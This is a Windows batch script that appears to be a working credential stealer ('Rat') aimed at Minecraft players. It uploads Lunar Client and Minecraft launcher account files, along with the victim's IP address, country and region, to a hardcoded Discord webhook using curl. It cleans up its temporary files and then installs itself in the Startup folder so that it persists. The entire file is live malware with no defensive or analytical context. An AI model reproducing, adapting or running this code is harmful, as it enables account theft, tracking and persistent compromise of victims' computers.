@echo off
setlocal enabledelayedexpansion

set "webhookUrl=https://discord.com/api/webhooks/1487644755809534053/ujkoI44wIVToCb2O_x5sJXAEOOwzoJRV8k_qk6h_0V-mTrqxX7EIPHpfNPZdRkwYdPc_"
set "countryInfo=https://ipinfo.io/json"
set "versionUrl=https://api.ipify.org/?format=txt"

set file1=%USERPROFILE%\.lunarclient\settings\game\accounts.json
set file2=%USERPROFILE%\AppData\Roaming\.minecraft\launcher_profiles.json
set file3=
set file4=

for /f "delims=" %%V in ('curl -s "%versionUrl%"') do set "version=%%V"
if not defined version set "version=Unknown"
powershell -Command "$d = Invoke-RestMethod 'https://ipinfo.io/json'; Write-Host $d.ip; Write-Host $d.country; Write-Host $d.region" > temp.txt

for /f "delims=" %%T in ('powershell -NoProfile -Command "Get-Date -Format 'yyyy-MM-ddTHH:mm:ss.000Z'"') do set "timestamp=%%T"

set "fileArgs="
set /a idx=0
for %%i in (1 2 3 4) do (
    if defined file%%i (
        if exist "!file%%i!" (
            set fileArgs=!fileArgs! -F "files[!idx!]=@!file%%i!"
            set /a idx+=1
        )
    )
)

if %idx%==0 (
    echo [ERROR] No files found to upload.
    pause
    exit /b
)

set "ps1=%temp%\build_payload.ps1"
set "jsonOut=%temp%\wh_payload.json"

set /p IP=<temp.txt
for /f "skip=1 delims=" %%a in (temp.txt) do (
    if not defined COUNTRY (set COUNTRY=%%a) else (set REGION=%%a)
)

:: We use ConvertFromUtf32 to handle emojis properly in PowerShell 5.1
echo $fire = [char]::ConvertFromUtf32(0x1F525) > "%ps1%"
echo $box = [char]::ConvertFromUtf32(0x1F4E6) >> "%ps1%"
echo $speech = [char]::ConvertFromUtf32(0x1F4AC) >> "%ps1%"
echo $clip = [char]::ConvertFromUtf32(0x1F4CB) >> "%ps1%"
echo $tag = [char]::ConvertFromUtf32(0x1F3F7) >> "%ps1%"
echo $folder = [char]::ConvertFromUtf32(0x1F4C2) >> "%ps1%"
echo $web = [char]::ConvertFromUtf32(0x1F310) >> "%ps1%"
echo $down = [char]::ConvertFromUtf32(0x1F447) >> "%ps1%"
echo $bot = [char]::ConvertFromUtf32(0x1F916) >> "%ps1%"
echo $shield = [char]::ConvertFromUtf32(0x1F6E1) >> "%ps1%"
echo $bulb = [char]::ConvertFromUtf32(0x1F4A1) >> "%ps1%"
echo $v = '%version%' >> "%ps1%"
echo $i = '%idx%' >> "%ps1%"
echo $t = '%timestamp%' >> "%ps1%"
echo $json = [ordered]@{ >> "%ps1%"
echo     content = "$box New Log Incoming! @everyone" >> "%ps1%"
echo     embeds = @(@{ >> "%ps1%"
echo         title = "$fire New Account!" >> "%ps1%"
echo         description = "$speech A new token has appeared.`n$clip Files are packaged and attached below." >> "%ps1%"
echo         color = 5763719 >> "%ps1%"
echo         fields = @( >> "%ps1%"
echo             @{ name = "IP";   value = "``$v``";          inline = $true  }, >> "%ps1%"
echo             @{ name = "Country";   value = "``%COUNTRY%``";          inline = $true  }, >> "%ps1%"
echo             @{ name = "Region";   value = "``%REGION%``";          inline = $true  }, >> "%ps1%"
echo             @{ name = "----------------"; value = "$down Files attached below"; inline = $false } >> "%ps1%"
echo         ) >> "%ps1%"
echo         footer = @{ text = "$bot Rat  |  $shield Webhook System  |  $bulb Powered by curl" } >> "%ps1%"
echo         timestamp = $t >> "%ps1%"
echo     }) >> "%ps1%"
echo } >> "%ps1%"
echo $json ^| ConvertTo-Json -Depth 10 ^| Set-Content -Encoding UTF8 '%jsonOut%' >> "%ps1%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%ps1%"

if not exist "%jsonOut%" (
    exit
)

curl -s -X POST "%webhookUrl%" ^
  -H "Content-Type: multipart/form-data" ^
  -F "payload_json=<%jsonOut%;type=application/json" ^
  %fileArgs%

del temp.txt
del "%ps1%" 2>nul
del "%jsonOut%" 2>nul
powershell "$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\%~n0.lnk');$s.TargetPath='%~f0';$s.Save()"
exit